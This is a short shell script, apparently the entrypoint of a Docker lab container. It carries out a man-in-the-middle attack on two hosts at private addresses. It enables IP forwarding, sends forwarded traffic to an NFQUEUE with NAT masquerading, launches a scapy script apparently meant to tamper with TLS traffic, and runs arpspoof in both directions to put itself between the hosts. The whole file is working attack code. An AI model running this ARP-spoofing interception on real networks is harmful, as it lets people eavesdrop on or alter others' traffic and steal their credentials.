#!/bin/sh
netstat -i
whereis python3
python3 -V
sysctl -w net.ipv4.ip_forward=1
sysctl net.ipv4.ip_forward
iptables -A FORWARD -j NFQUEUE --queue-num 2
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Make sure to use an unbuffered output (-u), otherwise it doesn't show in 'docker logs'
python3 -u /home/mitm/scapyTLS.py &

arpspoof -i eth0 -t 172.30.0.2 172.30.0.1 &
arpspoof -i eth0 -t 172.30.0.1 172.30.0.2 &
tail -f /dev/null
